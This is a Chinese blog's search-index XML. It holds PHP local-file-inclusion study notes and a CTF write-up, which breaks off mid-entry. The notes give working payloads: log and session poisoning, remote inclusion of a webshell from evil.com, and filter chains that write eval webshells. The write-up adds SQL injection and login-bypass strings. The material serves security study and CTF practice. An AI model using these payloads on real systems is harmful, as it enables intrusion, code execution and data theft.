<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP 本地文件包含(LFI)漏洞学习笔记</title>
      <link href="2020/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久之前就想写这篇文章了，这次正好接着这个国庆假期就好好写一写，给自己加深写印象。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>何为LFI？全程Local File Inclusion，中文译作本地文件包含漏洞。</p><a id="more"></a><p>既然是包含漏洞，那肯定少不了包含的函数。在PHP中，通常是下面四个包含函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure><p>这四个函数功能相近，其中带<code>_once</code>的函数与不带<code>_once</code>的函数区别在于：对于前者不会进行重复引用，故而造成某些变量覆盖问题。而include和require区别主要是，include在包含的过程中如果出现错误，<strong>会抛出一个警告，程序继续正常运行</strong>；而require函数出现错误的时候，<strong>会直接报错并退出程序的执行</strong>。</p><h2 id="两种文件包含"><a href="#两种文件包含" class="headerlink" title="两种文件包含"></a>两种文件包含</h2><p>既然我们可以选择任意文件进行包含，如果我们选择一个webshell的话，那么岂不是就能拿到网站的控制权限？</p><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>最简单的，我们可以通过上传一个包含webshell内容的图片，然后通过包含此图片即可得到一个可以控制的webshell。</p><p>除了上传恶意文件以外，我们也可以通过包含一些日志服务产生的日志文件。常用的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;environ</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;1,2,3,4...</span><br><span class="line"># ssh日志，攻击方法：</span><br><span class="line"># ssh &#96;&lt;?php phpinfo(); ?&gt;&#96;@192.168.1.1</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log</span><br><span class="line"># apache日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;[access.log|error.log]</span><br></pre></td></tr></table></figure><p><strong>session文件包含</strong></p><p>此方法需要PHP版本&gt;5.4.0、配置项：<code>session.upload_progress.enabled</code>的值为On、代码中存在session_start函数，不过好在其默认值为On。</p><p>此方法的作用是记录上传文件时的一些信息之用。</p><p>当我们在上传文件时，若存在一个上传的字段名与<code>session.upload_progress.name</code>的值相同的话，当前文件的上传进度信息将会保存在<code>$_SESSION</code>中获得。</p><p>如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，在相应的session文件中，就会存有我们上传的恶意代码。</p><p>session默认位置：<code>/var/lib/php/sessions/sess_[Cookie中PHPSESSID的值]</code>。</p><p><strong>tmp临时文件包含</strong></p><p>同样是上传文件，当PHP遇到<code>enctype=&quot;multipart/form-data</code>时，会产生临时文件来保存上传文件内容，等上传结束后再执行相应操作（及时当前php文件不存在php代码，同样会产生临时文件）。</p><p>临时文件默认目录为：</p><ul><li>Linux：<code>/tmp/php[w]&#123;6&#125;</code></li><li>Windows：<code>C:/Windows/php[4个随机字符].tmp</code></li></ul><p>法一：分段传输防止临时文件删除过快。</p><p>需要提前知道临时文件的具体位置（上传位置填phpinfo文件时，回显内容中会提供）。</p><p>法二：PHP异常崩溃</p><p>上传位置填LFI文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 7.0.0 &lt;&#x3D; PHP Version &lt; 7.0.28</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">2. php7 老版本通杀</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure><p>第一种是由于：</p><blockquote><p>php代码中使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不想phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p></blockquote><p>当PHP异常退出后，就可以编写脚本，通过遍历文件来尝试包含后getshell了。</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>利用前提（与data协议的利用前提相同）：</p><ul><li>allow_url_fopen = On 是否允许打开远程文件</li><li>allow_url_include = On 是否允许include/require远程文件</li></ul><p>若 allow_url_fopen为Off，而allow_url_include为On，可以直接利用<code>php://input</code>执行恶意代码。</p><p>利用过程：</p><p>在公网上比如<code>evil.com/1.txt</code>存放恶意webshell，通过包含<code>http://evil.com/1.txt</code>即可执行恶意payload。</p><h2 id="PHP伪协议简单入门"><a href="#PHP伪协议简单入门" class="headerlink" title="PHP伪协议简单入门"></a>PHP伪协议简单入门</h2><p>何为伪协议？简单的说，就是自己定义的协议，也只有自己的软件支持，其他软件都不识别的协议就是伪协议。</p><p>在PHP中，PHP给自己定义了一个php伪协议，以：<code>php://</code>起头。</p><p>至于<code>http://</code>、<code>file://</code>这些都不是伪协议，都是大部分系统/软件都支持的协议，共享同一套协议标准。</p><p>当然，也不只是只有包含函数能使用，类似其他许多涉及到文件读取/写入的函数都可能存在问题，这里我再列举出一些也可以使用PHP伪协议的函数：</p><ul><li>file_get_contents</li><li>file_put_contents</li><li>readfile</li><li>fopen</li><li>file</li><li>show_source或highlight_file</li></ul><p>需注意的是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="variable">$_GET</span>[<span class="string">&#x27;yunen&#x27;</span>]); <span class="comment"># 有回显</span></span><br><span class="line">file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;yunen&#x27;</span>]); <span class="comment"># 无回显</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;yunen&#x27;</span>]); <span class="comment"># 有回显</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># show_source相当于自带输出功能，而file_get_contents并没有。</span></span><br></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>官方定义如下：</p><blockquote><p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p><p>php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p></blockquote><p>简单的说就是php伪协议的过滤器功能，可以通过拼接各种过滤器达到快速转换字节流的效果。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="comment"># ?file=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>此时php会读取flag.php文件内容后，通过convert过滤器的base64-encode方法，最总将所得结果以php代码的形式包含到运行的php文件之中，由于base64编码之后的内容不会出现<code>&lt;?</code>，所以必然<strong>不会被识别为php代码</strong>，故而能起到<strong>文件读取</strong>的作用。</p><p><img src="https://img.0x002.com/article/LFI/image-20201001030030448.png" alt="image-20201001030030448"></p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提：<code>allow_url_include=On</code>，PHP版本&gt;5.2后，默认值为Off。</p><p>此方法相当于取HTTP数据包的BODY数据（即POST数据）。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;yunen&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如下图：</p><p><img src="https://img.0x002.com/article/LFI/image-20201001030929069.png" alt="image-20201001030929069"></p><p>注意，此协议也可直接执行恶意代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;f&#39;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#URL: &#x2F;lfi.php?f&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">#POST DATA: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="php伪协议进阶学习"><a href="#php伪协议进阶学习" class="headerlink" title="php伪协议进阶学习"></a>php伪协议进阶学习</h2><p>从这开始后文可能会有点乱，因为我实在不知道如何按什么顺序来写，只好想到哪写到哪了。</p><h3 id="过滤器列表"><a href="#过滤器列表" class="headerlink" title="过滤器列表"></a>过滤器列表</h3><p>对于<code>php://</code>来说，支持多种过滤器嵌套，其格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;[read|write]&#x3D;[过滤器1]|[过滤器2]&#x2F;resource&#x3D;文件名称（包含后缀名）</span><br><span class="line"># 过滤|的情况下，使用多过滤器：</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件名称</span><br></pre></td></tr></table></figure><p>其中<code>filter/[read|write]=[过滤器]</code>可简写为<code>filter/[过滤器]</code>，php会自选判断是read还是write。</p><p>而对于过滤器来说，php伪协议主要支持以下几类：</p><ul><li><a href="https://www.php.net/manual/zh/filters.string.php">字符串过滤器</a></li><li><a href="https://www.php.net/manual/zh/filters.string.strip_tags.php">string.strip_tags（PHP7.3.0废弃）</a></li><li><a href="https://www.php.net/manual/zh/filters.convert.php">转换过滤器</a></li><li><a href="https://www.php.net/manual/zh/filters.compression.php">压缩过滤器</a></li><li><a href="https://www.php.net/manual/zh/filters.encryption.php">加密过滤器</a></li></ul><p>嵌套过程的执行流程为从左到右。常用的过滤器有：</p><table><thead><tr><th>过滤器名称</th><th>说明</th><th>类别</th><th>版本</th></tr></thead><tbody><tr><td>string.rot13</td><td>rot13转换</td><td>字符串过滤器</td><td>PHP&gt;4.3.0</td></tr><tr><td>string.toupper、string.tolower</td><td>大小写互转</td><td>字符串过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>string.strip_tags</td><td>去除<code>&lt;?(.*?)?&gt;</code>的内容</td><td>string.strip_tags</td><td>PHP&lt;7.3.0</td></tr><tr><td>convert.base64-encode、convert.base64-decode</td><td>base64编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.quoted-printable-encode、convert.quoted-printable-decode</td><td>URL编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.iconv.编码1.编码2</td><td>任意编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>zlib.deflate、zlib.inflate</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr><tr><td>bzip2.compress、bzip2.decompress</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr></tbody></table><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h3><p>对于写出函数来说，php伪协议同样可以执行，此考点以死亡exit最为出名，常在CTF中碰见。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$filename</span>;</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&#x27;&lt;php exit()?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如何跳出死亡exit，让程序执行我们人为定义的代码？</p><p><strong>法一：convert.base64-decode过滤器</strong></p><p>此方法需要注意，convert.base64-decode过滤器的特殊规则：</p><ul><li>遇到除<code>[a_zA-Z0-9_/]</code>之外的字符通通忽略不计</li><li>每4个字符作为一组进行解码，最后一组可不满4个字符</li><li>等号后边不允许接除了等号以外的任何内容，如：<code>=a √、== ×</code>。</li></ul><p>而对于上题来说，<code>php://filter/write=</code>此处的等号可以简写成：<code>php://filter/</code>，但是后边的<code>resource=文件名</code>却不能简写或去掉。</p><p>可以配合convert.quoted-printable-decode过滤器，将等号吞掉，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.quoted-printable-decode&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="string">&quot;/resource=aaaPD9waHAgZXZhbCgkX0dFVFsxXSk7LyogPz4&quot;</span>);</span><br><span class="line"><span class="comment">/* Outputs:  /resourceªaPD9waHAgZXZhbCgkX0dFVFsxXSk7LyogPz4  */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中的<code>ª</code>为<code>=aa</code>经过convert.quoted-printable-decode过滤器转换而得。</p><p>而对于后边的convert.base64-decode过滤器来说，<code>ª</code>为可忽略字符，故在不影响后续转换的前提下将等号吞掉了，类似于宽字节SQL注入的原理。</p><p><strong>法二：convert.iconv.utf-8.utf-7过滤器</strong></p><p>此过滤器会将等号转换成<code>+AD0-</code>，从而避开了后边的<code>resource=文件名</code>的影响。</p><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;yunen.php</span><br></pre></td></tr></table></figure><p>此方法需要求：</p><ul><li>包含函数不能为require，因为不存在<code>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</code>过滤器。</li><li>而对于<code>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</code>处，注意不能出现等号，因为可能会影响前边的base64数据，可在编码前的数据尾添加一些垃圾数据防止影响（base64分段编码特性）。</li></ul><p><strong>法三：usc-2、usc-4过滤器</strong></p><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?&#x2F;resource&#x3D;s1mple.php;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)&#x2F;resource&#x3D;s1mple.php</span><br></pre></td></tr></table></figure><p>摘自：<a href="https://xz.aliyun.com/t/8163#toc-14">file_put_content和死亡·杂糅代码之缘</a></p><p><strong>法四：string.strip_tags过滤器</strong></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;?&gt;&#x2F;..&#x2F;yunen.php</span><br></pre></td></tr></table></figure><p>前提条件：</p><ul><li>PHP版本&lt;7.3.0</li><li>Linux服务器（Windows不允许文件夹/文件名带<code>?</code>与<code>&gt;</code>。）</li></ul><p><strong>法五：zlib.deflate|string.tolower|zlib.inflate压缩解压过滤器</strong></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;&#x2F;resource&#x3D;2.php</span><br></pre></td></tr></table></figure><p>原理：先通过zlib将流数据进行压缩，再讲其中的大写字母转小写后进行解压，所得数据与最初发数据会产生部分差别，故<code>&lt;?php exit()</code>将会变成<code>&lt;?php@厁it();</code>。</p><h1 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h1><p>除了php伪协议外，PHP还支持包含以下协议的数据流：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure><h2 id="限制包含文件的后缀名"><a href="#限制包含文件的后缀名" class="headerlink" title="限制包含文件的后缀名"></a>限制包含文件的后缀名</h2><p>在CTF题中，经常遇到限制了后缀的，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;f&#39;].&#39;.php&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可是我们却无法上传php文件，该如何利用呢？</p><p><strong>法一：00截断</strong></p><p>前提：PHP版本&lt;5.3.4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lfi.php?f&#x3D;shell.txt%00</span><br></pre></td></tr></table></figure><p><strong>法二：长度截断</strong></p><p>前提：PHP版本&lt;5.2.10 (?)</p><p>操作系统对于目录字符串存在长度限制，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lfi.php?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;[.&#x2F;]+&#x2F;.&#x2F;shell.txt</span><br><span class="line">lfi.php?file&#x3D;.&#x2F;shell.txt&#x2F;.[...]+. # 仅Windows下有效</span><br></pre></td></tr></table></figure><p><strong>法三：zip、phar协议</strong></p><p><img src="https://img.0x002.com/article/LFI/image-20201003021905721.png" alt="image-20201003021905721"></p><p>zip与phar协议均不在意所选定文件的后缀名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;文件路径&#x2F;zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）</span><br><span class="line">phar:&#x2F;&#x2F;文件路基&#x2F;phar文件名称&#x2F;phar内的文件名称</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.php.net/manual/zh/wrappers.php">PHP手册-支持的协议和封装协议</a></li><li><a href="https://wooyun.js.org/drops/PHP文件包含漏洞总结.html">PHP文件包含漏洞总结</a></li><li><a href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘</a></li><li><a href="https://www.anquanke.com/post/id/177491">LFItoRCE利用总结</a></li><li><a href="https://xz.aliyun.com/t/5535">浅析php文件包含及其getshell的姿势</a></li><li><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li><li><a href="https://www.anquanke.com/post/id/202510">探索php://filter在实战当中的奇技淫巧</a></li><li><a href="https://ninjia.gitbook.io/secskill/web/incle">1.39 文件包含漏洞</a></li><li><a href="https://www.anquanke.com/post/id/201136">PHP LFI 利用临时文件 Getshell 姿势</a></li><li><a href="https://err0rzz.github.io/2017/08/31/file_include/">文件包含一些常识</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> LFI </tag>
            
            <tag> 本地包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百道CTF刷题记录(四)之BUUCTF</title>
      <link href="2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/"/>
      <url>2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E5%9B%9B)%E4%B9%8BBUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接上篇，继续刷题</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>考点：报错注入。过滤了<code>空白字符、=</code>等</p><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 取表名</span><br><span class="line">check.php?username&#x3D;1&amp;password&#x3D;1%27^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())),0x7e),1)%23</span><br><span class="line"></span><br><span class="line"># 取列名</span><br><span class="line">check.php?username&#x3D;1&amp;password&#x3D;1%27^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(database())),0x7e),1)%23</span><br><span class="line"></span><br><span class="line"># 读数据</span><br><span class="line">check.php?username&#x3D;1&amp;password&#x3D;1%27^updatexml(1,concat(0x7e,(select(group_concat(id,password,username))from(H4rDsq1)),0x7e),1)%23</span><br><span class="line"></span><br><span class="line"># 读取不全使用right()取右边部分内容</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>登录注入题。</p><p>老规矩，先分别使用单引号试报错，顺便看看pw参数有无带入数据库查询（与常见登录验证判断有关）。</p><p>尝试后发现，user参数报错，pw不报错。</p><p>猜测后端验证逻辑应该是先通过用户名查询数据库信息，再与pw参数做比较。</p><p>对于这种验证码方法我们通常采用联合注入法，通过控制返回内容来绕过登录。</p><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search.php</span><br><span class="line"></span><br><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;%23&amp;pw&#x3D;123</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>打开题目，发现页面存在一个奇怪链接：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;Download?filename=help.docx&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>help<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看样子应该是一个任意文件下载，只不过不知道能不能跨目录出去读取其他文件。</p><p>这里存在一个脑洞，直接GET会报错，改换POST访问才行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>不过也是通过这个“脑洞”，让我们得知此题的后端程序是java。</p><p>我们知道，对于java的web开发，WEB-INF文件夹至关重要，其中的web.xml文件对要访问的文件进行相应映射才能访问。</p><blockquote><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class。<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件。</p><p><strong>利用</strong>：<br>通过找到web.xml文件，推断class文件路径，最后下载class文件，通过反编译class文件，得到网站源码。</p><p>摘自：<a href="http://sunu11.com/2017/04/28/11/">Web源码泄露总结</a></p></blockquote><p>故我们读取/WEB-INF/web.xml。</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200902010912503.png" alt="读取web.xml"></p><p>根据命名规则我们推断该class对应的字节码文件应存放在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 